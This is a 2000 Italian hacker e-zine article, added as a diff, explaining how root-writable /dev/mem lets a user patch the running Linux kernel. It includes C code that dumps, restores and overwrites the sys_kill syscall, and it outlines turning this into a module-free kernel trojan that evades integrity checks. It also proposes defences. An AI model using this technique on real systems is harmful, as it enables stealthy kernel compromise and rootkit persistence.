@@ -1,0 +1,356 @@
+==============================================================================
+-------------[ BFi numero 9, anno 3 - 03/11/2000 - file 20 di 21 ]------------
+==============================================================================
+
+
+-[ MiSCELLANE0US ]------------------------------------------------------------
+---[ /DEV/MEM CR0CK
+-----[ ralph
+
+
+Questo art e' volto all'analisi di un particolare flaw presente nel kernel di
+alcuni Unix, in particolare prendero' in esame Linux su architettura i386,
+per quanto le conclusioni che se ne ricavano possano essere facilmente portate
+su altre architetture e possibilmente su altri OS. Premetto che l'intero
+lavoro di ricerca l'ho effettuato personalmente e prego il lettore di
+perdonare eventuali imprecisioni, ma (s)fortunatamente non disponevo di
+materiale analogo a quello che stavo realizzando per poter effettuate un
+confronto.
+
+Linux basa una porzione rilevante di codice sulla tipologia di gestione della
+memoria che ricava dall'utilizzo della sua architettura nativa, l'i386 che
+offre dei servizi per paginare il codice in modo da impedire visibilita',
+scrittura ed esecuzone di alcune porzioni di memoria, in particolare per fare
+in modo che un processo non esca dallo spazio che il kernel stesso gli
+assegna.
+Per fare cio' l'i386 mette a disposizione un sistema di gestione della memoria
+segmentato, lo spazio di indirizzamento logico puo' essere diviso in insiemi
+di sottospazi unidimensionali (per un massimo di 16383) denominati segmenti.
+Un puntatore completo in questo modello di memoria e' costituito da due parti:
+
+a) un selettore di segmento di 16 bits
+b) un offset a 32 bits che indirizza il puntatore all'interno del segmento
+   stesso 
+
+La dimensione del segmento e' variabile e questo fa si che si possa associare
+ad un segmento un particolare modulo, che seppur venga posizionato in una
+posizione di memoria non nota a priori conserva un offset costante, variando
+il selector.
+Il segmento e' l' unita' di protezione e i descriptors contengono le
+informazioni di protezione del segmento stesso, tra cui la writeabilita' e la
+readabilita'.
+Qui entrano in gioco i livelli di privilegio: alcuni livelli di privilegio
+hanno un accesso meno ristretto alle risorse e quindi permettono di creare
+delle sovrastrutture ai processi in esecuzione, potendone modificare lo
+status.
+I livelli di protezione a livello implementativo sono costituiti da 4 ring
+(dallo 0 al 3).
+
+I descriptor contengono un campo DPL, ossia il livello del privilegio del
+descriptor, i selector un RPL, ossia il livello di privilegio del richiedente
+l'indirizzamento, inoltre un registro interno del processore non accessibile
+direttamente denominato CPL contiene il ring corrente. Per indirizzare della
+memoria in un dato segmento il selettore deve essere posto in un registro di
+segmento dati (DS,ES,FS,GS,SS) e il processore quindi si occupa di valutarne
+l'accessibilita'.
+A ring 0 l'intero spazio di indirizzamento logico e' accessibile, a ring 1
+solo quello del ring 1 stesso, del ring 2 e del ring 3, a ring 2 solo quello
+del ring 2 e e del ring 3 e a ring 3 solo quello del ring 3. In generale si
+puo' dire che il livello di privilegio garantisce la possibilita' di
+indirizzamento solo per segmenti con ring maggiore o al massimo uguale a
+quello del richiedente.
+Intel suggerisce un utilizzo pratico di questa caratteristica:
+'Questa proprieta' dell' 80386 puo' essere usata, ad esempio, per impedire
+alle procedure applicative di leggere o modificare le tabelle del sistema
+operativo'.
+Per questo motivo normalmente un processo a livello utente non puo' modificare
+spazi del kernel.
+
+Focalizziamo ora l' attenzione sui sistemi *nix, in particolare qui
+descrivero' il sistema trattato da Andrew S. Tanenbaum e Albert S. Woodhull,
+quindi propriamete minix, su cui poi Linux si basa in alcuni aspetti.
+minix divide il sistema nel seguente modo:
+
+ring 0: nucleo
+ring 1: chiamate di sistema
+ring 2: spazio condiviso
+ring 3: programmi utente
+
+Questo impedisce ad un utente la modifica di aspetti caldi del sistema senza
+che questo lo permetta.
+Cambiamo ora prospettiva al problema della protezione della memoria. I
+privilegi ovviamente avvengono anche per l'hardware e questo fa si che il
+sistema debba offrire un'interfaccia per accedervi. Per fare cio' mette a
+disposizione file speciali (in /dev usualmente) che fanno da porta di
+comunicazione tra il kernel e lo userspace (a ring 3), ossia ci permettono
+l'accesso all'hardware interfacciandolo per noi, senza cosi' violare o
+entrare in conflitto con l'architettura.
+Per fare un esempio concreto /dev/hda sotto linux rappresenta l'hdd primary
+master e un qualsiasi programma abbia accesso in lettura a /dev/hda puo'
+tranquillamente leggere l'hdd senza preoccuparsi dei dettagli implementativi:
+qui nasce il flaw.
+Linux tra i vari device file che mette a disposizione ne fornisce uno che
+offre un accesso ambiguo ad una zona di memoria, mi riferisco a /dev/mem:
+
+crw-r-----   1 root     kmem       1,   1 Jul 18  1994 /dev/mem
+
+Quel 'kmem' ben suggerisce quello che fa': mappa il selector 0x0c, che
+rappresenta lo spazio condiviso del kernel. Solitamente l'accesso a questo
+selector ci viene dato con l'uso di lkm, moduli del kernel, ma se il sistema
+non dispone di possibilita' di aggiungere moduli l'uso malizioso (neanche
+tanto a dire il vero) di questo device si rende interessante.
+Nella zona condivisa di cui cosi' ci garantiamo l'accesso sono situate alcune
+cose interessanti, per averne un'idea il file /usr/src/linux/System.map ne
+contiene un indice. 
+A questo punto e' abbastanza ovvio come procedere, quindi quando notai questa
+discrepanza logica nel device /dev/mem provai a verificare le mie supposizioni
+tramite qualche piccolo esperimento. Mi proposi di far eseguire del codice
+custom ad una systemcall, in particolare alla kill() (SYS_kill,
+la sys_call_table[37] per la precisione) ma ovviamente bisognava tener
+presente che non potevo permettermi di fare un cross dei segmenti mescolando
+il selector 0x0c con quello del mio codice per l'uso di variabili.
+Innanzitutto bisognava localizzare la kill():
+
+-[ root:/usr/src/linux ]- # grep sys_kill System.map 
+c010e0cc T sys_kill
+
+e cosi' facendo ottengo il puntatore, completo di selector che ovviamente
+rimoddi essendo l'unica zona mappata del kernel la 0x0c, quindi sys_kill nel
+mio kernel e' situata in /dev/mem all'offset 0x10e0cc. Su altri sistemi
+potrebbe essere localizzato in altre posizioni, per rintracciarlo si possono
+usare anche altre tecniche oltre alla System.map:
+
+*) si puo' cercare il pattern in memoria della sys_call_table[] se questo mi
+   e' noto
+*) si puo' cercare direttamente il pattern della sys_kill, conoscendone 
+   l'architettura sottostante ed il compilatore, anche con settaggi differenti
+   del kernel dovrebbe corrispondere
+*) ...
+
+a questo punto necessitavo di un sistema per salvarmi da eventuali errori,
+dumpando su file un po' di sys_kill per restorarla in caso di necessita':
+
+#include <stdio.h>
+#include <sys/types.h>
+
+int 
+main()
+{
+  FILE *dump, *mem;
+  int i;
+  unsigned char tmp; 
+
+  dump = fopen("sysdump","w");
+  if (dump==0)
+    {
+      printf("cannot open [ ./sysdump ]\n");
+      return -1;
+    }
+
+  mem = fopen("/dev/mem","r");
+  if (mem==0)
+    {
+      printf("cannot open [ /dev/mem ]\n");
+      return -1;
+    }
+  
+  fseek(mem,0x10e0cc,SEEK_SET);
+
+  for (i=0;i<1024;i++)
+    {
+      fread(&tmp,1,1,mem);
+      fwrite(&tmp,1,1,dump);
+    }
+
+  return 0;
+}
+
+...il che non e' il massimo dell' eleganza, ma il suo compito lo svolge.
+Quindi stesi anche un sistema che mi permettesse di ripristinare il dump:
+
+#include <stdio.h>
+#include <sys/types.h>
+
+int 
+main()
+{
+  FILE *dump, *mem;
+  int i;
+  unsigned char tmp; 
+
+  dump = fopen("sysdump","r");
+  if (dump==0)
+    {
+      printf("cannot open [ ./sysdump ]\n");
+      return -1;
+    }
+
+  mem = fopen("/dev/mem","w");
+  if (mem==0)
+    {
+      printf("cannot open [ /dev/mem ]\n");
+      return -1;
+    }
+  
+  fseek(mem,0x10e0cc,SEEK_SET);
+
+  for (i=0;i<1024;i++)
+    {
+      fread(&tmp,1,1,dump);
+      fwrite(&tmp,1,1,mem);
+    }
+
+  return 0;
+}
+
+Poco da dire anche su questo codice.
+A questo punto si trattava solo di provare a fargli fare qualcosa, in
+particolare far rendere un -3 alla sys_kill, corrispondente ad un ESRCH, ossia
+nel tentativo di killare un pid il risulatato e' che il dato pid pare non
+esistere. 
+Per fare cio' ho ritenuto fosse abbastanza comodo usare un po' di assembler,
+per gestire le cose di persona ovviando a eventuali problemi che del codice C
+compilato avrebbe potuto introdurre, come puntatori a variabili che perdendo
+il selector indirizzavano in posizioni sbagliate in memoria. Il codice e'
+molto semplice, basta rendere in eax il codice dell'errore:
+
+.text
+        .align 4
+
+
+.globl func
+        .type func,@function
+
+func:
+
+        nop
+        nop
+        movl $-3, %eax
+        ret
+
+
+.globl main
+        .type main, @function
+main:
+                ret
+
+Sintassi AT&T, come e' facile notare. Divisi la func per localizzarla piu'
+comodamente. Compilato il codice e dissassemblato, trovata la func questo ne
+e' il dump:
+
+08048380 <func>:
+ 8048380:       90                      nop    
+ 8048381:       90                      nop    
+ 8048382:       b8 fd ff ff ff          movl   $0xfffffffd,%eax
+ 8048387:       c3                      ret   
+
+Il paio di nop sono solo una misura precauzionale, se ne puo' fare
+tranquillamente a meno. A questo punto feci un piccolo programmino che si
+occupava di mettere nella sys_kill il dump:
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+int
+main()
+{
+  FILE* mem;
+  unsigned long pos;
+  unsigned char val[]={0x90,0x90,0xb8, 0xfd, 0xff, 0xff, 0xff, 0xc3};
+
+  mem=fopen("/dev/mem","w");
+  if (mem==NULL)
+    {
+      printf("Unable to open [ /dev/mem ]\n");
+      return -1;
+    }
+  
+  pos=0x10e0cc;
+  
+  fseek(mem,pos,SEEK_SET);
+  fseek(mem,pos,SEEK_SET);
+  fwrite(&val[0],sizeof(val),1,mem);
+ 
+  printf("[ Done ]\n");
+    
+  return 0;
+}
+
+In val[] si puo' ben notare il dump del codice precedente.
+Questo e' quello che ottenni (./funk era il nome di quest'ultimo programmino
+nel mio hdd):
+
+-[ root:/var/data/tests ]- # cat &
+[2] 324
+-[ root:/var/data/tests ]- # killall -9 cat
+[2]+  Killed                  cat
+-[ root:/var/data/tests ]- # cat &  
+[2] 326
+-[ root:/var/data/tests ]- # ./funk 
+[ Done ]
+
+[2]+  Stopped                 cat
+-[ root:/var/data/tests ]- # killall -9 cat
+cat: no process killed
+-[ root:/var/data/tests ]- # ./restoresys 
+-[ root:/var/data/tests ]- # killall -9 cat
+[2]+  Killed                  cat
+-[ root:/var/data/tests ]- # 
+
+Quindi a tutti gli effetti faceva il suo dovere.
+A questo punto si possono ben immaginare le conseguenze di tale risultato,
+patching del kernel a runtime o usi maliziosi che permettono la
+trojanizzazione del kernel senza usare moduli e senza modificare la
+sys_call_table[], un buon punto in cui accorgersi di eventuali modifiche ad
+opera di lkm, senza considerare che problemi del tutto analoghi non esistono
+solo su Linux.
+Esistono due particolari da ovviare:
+
+a) variablili
+b) spazio
+
+Per il primo la cosa e' semplice, si consideri il seguente sorgente:
+
+    jmp eod
+
+    ; data here
+
+eod:
+    ; code here
+
+In questo modo tra il jmp e l'eod ci assicuriamo spazio per le nostre
+variabili. Per avere piu' spazio la cosa e' altrettanto semplice: basta
+dividere il processo di patching in due parti: la prima volta ad allocare
+spazio, la seconda all'inserimento del codice. Per la prima kmalloc() chiamo
+dello spazio a nostro piacere e lo riempiamo, almeno l'inizio, con un pattern
+univoco, poi lo cerchiamo in /dev/mem, quindi sapendone la posizione ne
+ricostruiamo il puntatore; lo riempiamo con il nostro codice che emula anche
+la syscall originale, e nella sys_kill mettiamo un jmp (posizione del nostro
+codice nel descriptor 0x0c).
+Come al solito a questo punto quello che si puo' fare e' limitato solo dalla
+fantasia, si possono anche modificare funzioni che non sono system call,
+array vari in /dev/mem, zone di memoria contenenti informazioni calde etc.
+Questo e' quello che un utente malizioso potrebbe fare almeno. Dal punto di
+vista del sysadmin invece la cosa potrebbe significare l'upgrade parziale del
+kernel a runtime, senza necessita' di un reboot... il che non mi pare poco.
+Una soluzione contro eventuali attacchi potrebbe essere la rimozione delle
+permission di scrittura da /dev/mem, il che assicurerebbe l'impossibilita' di
+toccare zone cosi' 'calde' del sistema.
+
+[addon, tnx vecna e FuSyS]
+Il root eventualmente potrebbe anche controllare un fingerprint della syscall
+e della sys_call_table[], questo comporterebbe che per evitare che un
+programma esterno rilevi le differenze con il kernel originale bisognerebbe
+fargli leggere delle 'copie di backup', in sostanza una variazione dell'hide
+parziale di file.
+Il root potrebbe prevenire anche questo usando un modulo che legga
+direttamente in 0x0c....... i bytes per fare il fingerprint senza passare da
+/dev/mem ( e con un lkm potrebbe).
+
+ralph
+
+
+==============================================================================
+---------------------------------[ EOF 20/21 ]--------------------------------
+==============================================================================
